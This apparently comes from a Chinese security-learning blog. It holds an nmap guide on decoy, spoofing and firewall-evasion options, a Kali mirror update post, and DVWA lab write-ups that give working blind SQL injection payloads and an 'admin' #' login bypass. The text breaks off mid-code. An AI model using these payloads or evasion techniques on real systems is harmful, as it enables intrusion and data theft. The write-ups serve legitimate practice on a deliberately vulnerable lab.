<p>-F</p>
<p>快速扫描模式，只扫描在nmap-services文件中列出的端口。显然比扫描所有65535个端口要快。</p>
<p>-D</p>
<p>使用诱饵扫描方法对目标网络/主机进行扫描。如果nmap使用这种方法对目标网络进行扫描，那么从目标主机/网络的角度来看，扫描就象从其它主机 (decoy1,等)发出的。从而，即使目标主机的IDS(入侵检测系统)对端口扫描发出报警，它们也不可能知道哪个是真正发起扫描的地址。这种扫描方法可以有效地对付例如路由跟踪、response-dropping等积极的防御机制，能够很好地隐藏你的IP地址。</p>
<p>每个诱饵主机名使用逗号分割开，你也可以使用ME选项，它代表你自己的主机，和诱饵主机名混杂在一起。如果你把ME放在第六或者更靠后的位置，一些端口扫描检测软件几乎根本不会显示你的IP地址。如果你不使用ME选项，nmap会把你的IP地址随机夹杂在诱饵主机之中。</p>
<p>注意:你用来作为诱饵的主机应该正在运行或者你只是偶尔向目标发送SYN数据包。很显然，如果在网络上只有一台主机运行，目标将很轻松就会确定是哪台主机进行的扫描。或许，你还要直接使用诱饵的IP地址而不是其域名，这样诱饵网络的域名服务器的日志上就不会留下关于你的记录。</p>
<p>还要注意：一些愚蠢的端口扫描检测软件会拒绝路由试图进行端口扫描的主机。因而，你需要让目标主机和一些诱饵断开连接。如果诱饵是目标主机的网关或者就是其自己时，会给目标主机造成很大问题。所以你需要慎重使用这个选项。</p>
<p>诱饵扫描既可以在起始的ping扫描也可以在真正的扫描状态下使用。它也可以和-O选项组合使用。</p>
<p>使用太多的诱饵扫描能够减缓你的扫描速度甚至可能造成扫描结果不正确。同时，有些ISP会把你的欺骗包过滤掉。虽然现在大多数的ISP不会对此进行限制。</p>
<p>-S <IP_Address></IP_Address></p>
<p>在一些情况下，nmap可能无法确定你的源地址(nmap会告诉你)。在这种情况下，可以使用这个选项给出你的IP地址。</p>
<p>在欺骗扫描时，也使用这个选项。使用这个选项可以让目标认为是其它的主机对自己进行扫描。</p>
<p>-e</p>
<p>告诉nmap使用哪个接口发送和接受数据包。nmap能够自动对此接口进行检测，如果无效就会告诉你。</p>
<p>-g</p>
<p>设置扫描的源端口。一些天真的防火墙和包过滤器的规则集允许源端口为DNS(53)或者FTP-DATA(20)的包通过和实现连接。显然，如果攻击者把源端口修改为20或者53，就可以摧毁防火墙的防护。在使用UDP扫描时，先使用53号端口；使用TCP扫描时，先使用20号端口。注意只有在能够使用这个端口进行扫描时，nmap才会使用这个端口。例如，如果你无法进行TCP扫描，nmap会自动改变源端口，即使你使用了-g选项。</p>
<p>对于一些扫描，使用这个选项会造成性能上的微小损失，因为我有时会保存关于特定源端口的一些有用的信息。</p>
<p>-r</p>
<p>告诉nmap不要打乱被扫描端口的顺序。</p>
<p>–randomize_hosts</p>
<p>使nmap在扫描之前，打乱每组扫描中的主机顺序，nmap每组可以扫描最多2048台主机。这样，可以使扫描更不容易被网络监视器发现，尤其和–scan_delay 选项组合使用，更能有效避免被发现。</p>
<p>-M</p>
<p>设置进行TCP connect()扫描时，最多使用多少个套接字进行并行的扫描。使用这个选项可以降低扫描速度，避免远程目标宕机。</p>
<p><strong>Nmap探测选项</strong></p>
<table>
<thead>
<tr>
<th align="left">功能</th>
<th>选项</th>
<th>功能</th>
<th>选项</th>
</tr>
</thead>
<tbody><tr>
<td align="left">不发送Ping包</td>
<td>-PN</td>
<td>ICMP回应Ping</td>
<td>-PE</td>
</tr>
<tr>
<td align="left">执行仅用于扫描的Ping</td>
<td>-sP</td>
<td>ICMP时间戳Ping</td>
<td>-PP</td>
</tr>
<tr>
<td align="left">TCP SYN Ping</td>
<td>-PS</td>
<td>ICMP地址掩码Ping</td>
<td>-PM</td>
</tr>
<tr>
<td align="left">TCP ACK Ping</td>
<td>-PS</td>
<td>IP协议Ping</td>
<td>-PM</td>
</tr>
<tr>
<td align="left">UDP Ping</td>
<td>-PU</td>
<td>ARP Ping</td>
<td>-PR</td>
</tr>
<tr>
<td align="left">SCTP INIT Ping</td>
<td>-PY</td>
<td>Tracerote</td>
<td>–traceroute</td>
</tr>
<tr>
<td align="left">强制DNS逆向解析</td>
<td>-R</td>
<td>手动指定DNS服务器</td>
<td>–dns-servers</td>
</tr>
<tr>
<td align="left">禁止DNS逆向解析</td>
<td>-n</td>
<td>创建主机列表</td>
<td>-sL</td>
</tr>
<tr>
<td align="left">备用DNS查询</td>
<td>–system-dns</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>各类型TCP标记</strong></p>
<table>
<thead>
<tr>
<th>标记</th>
<th>用途</th>
<th>标记</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>SYN</td>
<td>同步</td>
<td>URG</td>
<td>紧急</td>
</tr>
<tr>
<td>ACK</td>
<td>确认</td>
<td>RST</td>
<td>复位</td>
</tr>
<tr>
<td>PSH</td>
<td>推（push）</td>
<td>FIN</td>
<td>完成</td>
</tr>
</tbody></table>
<p><strong>端口扫描选项</strong></p>
<table>
<thead>
<tr>
<th>功能</th>
<th>选项</th>
<th>功能</th>
<th>选项</th>
</tr>
</thead>
<tbody><tr>
<td>执行快速扫描</td>
<td>-F</td>
<td>扫描所有端口</td>
<td>-p “*”</td>
</tr>
<tr>
<td>扫描指定端口号的端口</td>
<td>-p（port）</td>
<td>扫描尽可能多的端口</td>
<td>–top-ports</td>
</tr>
<tr>
<td>扫描指定名称的端口</td>
<td>-p（name）</td>
<td>执行顺序端口扫描</td>
<td>-r</td>
</tr>
<tr>
<td>扫描特定协议的端口</td>
<td>-pU：(UDP Ports),T(TCP Ports)</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>绕过保护机制</strong></p>
<table>
<thead>
<tr>
<th>功能</th>
<th>选项</th>
<th>功能</th>
<th>选项</th>
</tr>
</thead>
<tbody><tr>
<td>数据包分片</td>
<td>-f</td>
<td>附加任意数据</td>
<td>–date-length</td>
</tr>
<tr>
<td>指定MTU</td>
<td>–mtu</td>
<td>随即指定目标扫描顺序</td>
<td>–randomize-hosts</td>
</tr>
<tr>
<td>诱骗</td>
<td>-D</td>
<td>MAC地址欺骗</td>
<td>–spoof-mac</td>
</tr>
<tr>
<td>空闲僵尸扫描</td>
<td>-sl</td>
<td>发送错误校验</td>
<td>–badsums</td>
</tr>
<tr>
<td>手动指定源端口</td>
<td>–source-port</td>
<td></td>
<td></td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>Kali-Linux 源更新</title>
    <url>/2018/10/17/Kali%E6%BA%90%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<h1 id="Kali源更新"><a href="#Kali源更新" class="headerlink" title="Kali源更新"></a>Kali源更新</h1><h3 id="一-添加更新源"><a href="#一-添加更新源" class="headerlink" title="一.添加更新源"></a>一.添加更新源</h3><p><code>gedit /etc/apt/sources.list</code></p>
<a id="more"></a>
<h3 id="二-更新源"><a href="#二-更新源" class="headerlink" title="二.更新源"></a>二.更新源</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#auto</span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#浙大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#东软大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line"></span><br><span class="line">#官方源</span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<!--more-->


<h3 id="三-更新"><a href="#三-更新" class="headerlink" title="三.更新"></a>三.更新</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y </span><br><span class="line"></span><br><span class="line">#linux内核更新</span><br><span class="line">apt-get install linux-headers-$(uname -r)</span><br></pre></td></tr></table></figure>

<p><strong>拓展</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get clean    &#x2F;&#x2F;清除缓存索引</span><br><span class="line">apt-get update    &#x2F;&#x2F;更新索引文件</span><br><span class="line">apt-get upgrade    &#x2F;&#x2F;更新实际的软件包文件</span><br><span class="line">apt-get dist-upgrade    &#x2F;&#x2F;根据依赖关系更新</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>DVWA-SQL(Blind)</title>
    <url>/2018/08/11/sql%20Blind/</url>
    <content><![CDATA[<h1 id="DVWA练习"><a href="#DVWA练习" class="headerlink" title="DVWA练习"></a><strong><em>DVWA练习</em></strong></h1><h3 id="SQL-Injection（Blind）"><a href="#SQL-Injection（Blind）" class="headerlink" title="SQL Injection（Blind）"></a>SQL Injection（Blind）</h3><p>SQL盲注与一般注入的区别在与，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者无法从显示页面上获取执行结果，甚至无法得知注入语句是否被执行，所以盲注难度一般较高。</p>
<p><strong>手工盲注思路</strong></p>
<blockquote>
<p>1.判断是否存在注入，注入是字符型还是数字型</p>
<p>2.猜解当前数据库名</p>
<p>3.猜解数据库中的表名</p>
<p>4.猜解表中的字段名</p>
<p>5.猜解数据</p>
</blockquote>
<a id="more"></a>
<p><strong>一.Low级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>; </span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>参数直接拼接在sql语句中没有做任何检查、过滤，存在明显的SQL注入漏洞 ，可以注入任意sql；在语法错误时有sql报错，更加方便于的编写注入sql。</p>
<p>漏洞利用</p>
<p>①基于布尔的盲注：可以使用二分法猜解出数据库名，表名，字段名。</p>
<p>②基于时间的盲注：同样采用二分法，判断是否明显感到时间延迟</p>
<p><strong>二.Medium级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>增加了<strong>mysql_real_escape_string()</strong>函数过滤，然后直接拼接的sql中</p>
<p>前端页面设置了下拉选择表单，希望以此来控制用户的输入 </p>
<p><img src="/images/sql_Blind/1.png" alt="1"></p>
<p>漏洞利用：通过抓包修改参数id，提交恶意构造的查询参数</p>
<p><strong>①基于布尔的盲注</strong></p>
<blockquote>
<p>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
<p>抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
<p>抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</p>
</blockquote>
<p><strong>②基于时间的盲注</strong></p>
<blockquote>
<p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p>
<p>抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</p>
<p>抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</p>
</blockquote>
<p><strong>三.High级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>; </span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Might sleep a random amount </span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123; </span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>High级别的代码利用cookie传递参数id，当查询结果为空时，会执行函数sleep(seconds)，扰乱基于时间的盲注 </p>
<p>在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果 </p>
<p>漏洞利用：可以通过#将LIMT 1注释掉，由于服务器执行sleep()函数，所以可以使用基于布尔的盲注</p>
<blockquote>
<p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
<p>抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
<p>抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</p>
</blockquote>
<p><strong>四.Impossible级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered? </span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123; </span><br><span class="line">        <span class="comment">// Check the database </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results </span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123; </span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">            header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>int型参数增加is_numeric判断，不接受其他字符串，避免了sql注入</p>
<p>使用PDO绑定参数的方式查询数据库</p>
]]></content>
      <categories>
        <category>DVWA练习</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA-Brute Force</title>
    <url>/2018/08/10/Brute%20Froce/</url>
    <content><![CDATA[<h1 id="DVWA练习"><a href="#DVWA练习" class="headerlink" title="DVWA练习"></a><em>DVWA练习</em></h1><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p><strong>一. Low级别</strong></p>
<p>服务器代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Login'</span>]))&#123;</span><br><span class="line"><span class="comment">//Getusername</span></span><br><span class="line">$user=$_GET[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Getpassword</span></span><br><span class="line">$pass=$_GET[<span class="string">'password'</span>];</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Checkthedatabase</span></span><br><span class="line">$query=<span class="string">"SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';"</span>;</span><br><span class="line">$result=mysql_query($query)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($result&amp;&amp;mysql_num_rows($result)==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//Getusersdetails</span></span><br><span class="line">$avatar=mysql_result($result,<span class="number">0</span>,<span class="string">"avatar"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Loginsuccessful</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;imgsrc="</span>&#123;$avatar&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//Loginfailed</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>代码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">$query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br></pre></td></tr></table></figure>

<p>登陆无限制，并没有对参数过滤且直接拼接在sql中</p>
<p>漏洞利用：</p>
<ol>
<li>暴力破解，利用BrupSuite Intruder模块进行破解</li>
</ol>
<p><img src="/images/Brute_Force/1.png" alt="1"></p>
<p>   2.SQL注入</p>
<p>​        Username：admin’ #</p>
<p>​        Password:(空)</p>
<p><img src="/images/Brute_Force/2.png" alt="2"></p>
<p><strong>二.Medium级别</strong></p>
<p>服务器代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Login'</span>]))&#123;</span><br><span class="line"><span class="comment">//Sanitiseusernameinput</span></span><br><span class="line">$user=$_GET[<span class="string">'username'</span>];</span><br><span class="line">$user=mysql_real_escape_string($user);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sanitisepasswordinput</span></span><br><span class="line">$pass=$_GET[<span class="string">'password'</span>];</span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Checkthedatabase</span></span><br><span class="line">$query=<span class="string">"SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';"</span>;</span><br><span class="line">$result=mysql_query($query)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($result&amp;&amp;mysql_num_rows($result)==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//Getusersdetails</span></span><br><span class="line">$avatar=mysql_result($result,<span class="number">0</span>,<span class="string">"avatar"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Loginsuccessful</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;imgsrc="</span>&#123;$avatar&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//Loginfailed</span></span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>代码分析：</p>
<p>相比于Low级别的代码：</p>
<p>①参数增加了mysql_real_escape_string()过滤，这个函数会对字符串中的特殊符号进行转义，基本上可以抵御SQL注入。</p>
<p>②$pass做了MD5校验，防止了通过参数password进行sql注入。</p>
<p>③登录失败时sleep(2)秒，可以暴力破解。方法与Low基本一致</p>
<p><strong>三.High级别</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Login'</span>]))&#123;</span><br><span class="line"><span class="comment">//CheckAnti-CSRFtoken</span></span><br><span class="line">checkToken($_REQUEST[<span class="string">'user_token'</span>],$_SESSION[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sanitiseusernameinput</span></span><br><span class="line">$user=$_GET[<span class="string">'username'</span>];</span><br><span class="line">$user=stripslashes($user);</span><br><span class="line">$user=mysql_real_escape_string($user);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sanitisepasswordinput</span></span><br><span class="line">$pass=$_GET[<span class="string">'password'</span>];</span><br><span class="line">$pass=stripslashes($pass);</span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Checkdatabase</span></span><br><span class="line">$query=<span class="string">"SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';"</span>;</span><br><span class="line">$result=mysql_query($query)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($result&amp;&amp;mysql_num_rows($result)==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//Getusersdetails</span></span><br><span class="line">$avatar=mysql_result($result,<span class="number">0</span>,<span class="string">"avatar"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Loginsuccessful</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;imgsrc="</span>&#123;$avatar&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//Loginfailed</span></span><br><span class="line">sleep(rand(<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 